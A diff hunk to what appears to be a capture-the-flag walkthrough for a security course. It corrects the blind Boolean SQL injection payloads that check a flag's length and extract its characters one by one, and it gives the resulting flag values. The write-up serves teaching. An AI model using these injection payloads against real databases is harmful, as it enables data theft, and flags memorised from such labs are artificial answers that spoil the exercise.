@@ -25,11 +25,11 @@ The result contains COMP6841{R8tW3xK5}.
 The page only reports whether a row exists, so use Boolean conditions. For
 example, first confirm the flag length:
 
-1 AND length((SELECT flag FROM flags WHERE challenge=3))=16
+1 AND length((SELECT flag FROM flags WHERE challenge=3))=18
 
 Then test each character, changing the position and candidate character:
 
-1 AND substr((SELECT flag FROM flags WHERE challenge=3),1,1)='F'
+1 AND substr((SELECT flag FROM flags WHERE challenge=3),1,1)='C'
 
 Repeat until the true responses spell COMP6841{B6dH1sY4}.
 
